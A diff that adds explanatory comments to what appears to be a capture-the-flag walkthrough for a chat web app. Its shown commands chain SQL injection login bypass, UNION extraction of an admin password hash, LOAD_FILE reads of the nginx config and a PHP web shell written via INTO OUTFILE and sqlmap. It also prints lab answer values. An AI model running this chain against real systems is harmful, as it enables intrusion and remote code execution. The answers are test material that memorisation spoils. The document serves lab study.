@@ -6,11 +6,12 @@
 
 ## Reconnaissance
 
-The app runs over HTTPS (nginx). Bypass SSL in curl with `-k` / `--no-check-certificate`.
+The app runs over HTTPS (nginx). Use `-k` or `--no-check-certificate` with curl to skip the SSL (Secure Sockets Layer) certificate check on self-signed lab certificates.
 
 ```bash
 curl -sk "https://TARGET_IP:PORT/" | grep -oP '(href|action)="[^"]*"'
 ```
+> Fetches the app's homepage over HTTPS and extracts all href and form action URLs. `-s` silences progress output, `-k` skips certificate verification. Replace `TARGET_IP` and `PORT` with your target's values.
 
 **Pages found:** `/login.php`, `/register.php`, `/api/login.php`, `/api/register.php`
 
@@ -30,16 +31,17 @@ curl -sk "https://TARGET_IP:PORT/api/login.php" \
   -d "username=pwner&password=Password1" \
   -D - -c /tmp/cookies.txt
 ```
+> Two-step account creation and login. The `invitationCode=' OR '1'='1` payload bypasses the invitation check via SQLi. The second curl logs in and saves the session cookie to `/tmp/cookies.txt`. `-D -` prints response headers so you can see the `Set-Cookie` header. Replace the username, password, `TARGET_IP`, and `PORT` with your values.
 
 ---
 
 ## Step 2 — Find Direct-Output Injection (q= parameter)
 
-After login, the app shows a messaging interface at `/?u=<id>&q=<search>`. The `q=` search parameter is injectable and reflects UNION results as messages.
+After login, the app shows a messaging interface at `/?u=<id>&q=<search>`. The `q=` search parameter is injectable. UNION results appear as chat messages in the response.
 
 **Column count:** 4 (confirmed via ORDER BY or `UNION SELECT NULL,NULL,NULL,NULL`)
 
-**Visible column:** 4 (rightmost — appears as message content)
+**Visible column:** 4 (rightmost — it appears as the message content in the chat view)
 
 ```bash
 # Confirm injection — single quote breaks query
@@ -50,6 +52,7 @@ curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
 curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
   -G --data-urlencode "u=1" --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,'MARKER'-- -"
 ```
+> Two-step injection confirmation. The first confirms the parameter is injectable (a `'` causes a 500 error). The second confirms UNION works — if `MARKER` appears in the response as a message, column 4 is visible and UNION injection is live. Replace `PHPSESSID=...` with your actual session cookie value.
 
 ---
 
@@ -79,10 +82,11 @@ curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
   -G --data-urlencode "u=1" \
   --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,Password FROM chattr.Users WHERE Username='admin'-- -"
 ```
+> Four-step enumeration chain via UNION injection. Each step builds on the previous. Note the injection syntax: `') UNION...-- -` — the `'` closes the string and `)` closes the LIKE wildcard before the UNION. `-G --data-urlencode` sends the payload as a properly encoded GET parameter. Replace `PHPSESSID=...` with your actual session cookie.
 
 **Q1 Answer:** `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU`
 
-> Hash algorithm: Argon2i — not crackable by standard hashcat wordlist attacks.
+> Hash algorithm: Argon2i — this is a modern, memory-hard hash. It is not crackable by standard hashcat wordlist attacks in any reasonable time.
 
 ---
 
@@ -94,6 +98,7 @@ curl -sk "https://TARGET_IP:PORT/index.php" -b "PHPSESSID=..." \
   -G --data-urlencode "u=1" \
   --data-urlencode "q=') UNION SELECT NULL,NULL,NULL,LOAD_FILE('/etc/nginx/sites-enabled/default')-- -"
 ```
+> Reads the nginx configuration file via `LOAD_FILE()`. The `root` directive inside reveals the webroot path needed for writing a shell. Replace the cookie and target values with your own.
 
 **Nginx config (relevant excerpt):**
 ```
@@ -127,6 +132,7 @@ curl -sk "https://TARGET_IP:PORT/shell.php?0=find+/+-maxdepth+4+-name+flag*+2>/d
 
 curl -sk "https://TARGET_IP:PORT/shell.php?0=cat+/flag_876a4c.txt"
 ```
+> Three-step RCE chain. First writes a PHP web shell to the discovered webroot using `INTO OUTFILE`. Then confirms execution with `id`. Finally finds and reads the flag file. Replace the session cookie, `TARGET_IP`, `PORT`, and the webroot path with your target's values.
 
 **Q3 Answer:** `061b1aeb94dec6bf5d9c27032b3c1d8d`
 
@@ -147,6 +153,7 @@ sqlmap ... --sql-query="SELECT LOAD_FILE('/etc/nginx/sites-enabled/default')"
 # Write shell
 sqlmap ... --file-write=/tmp/shell.php --file-dest=/var/www/chattr-prod/shell.php
 ```
+> SQLmap shortcut once injection is confirmed. `-p q` targets the `q` parameter, `--technique=U` forces UNION-only mode, `--batch` skips all prompts. `--file-write` uploads a local shell to `--file-dest` on the server. Replace the URL, cookie, database name, table, and paths with your target's values.
 
 ---
 
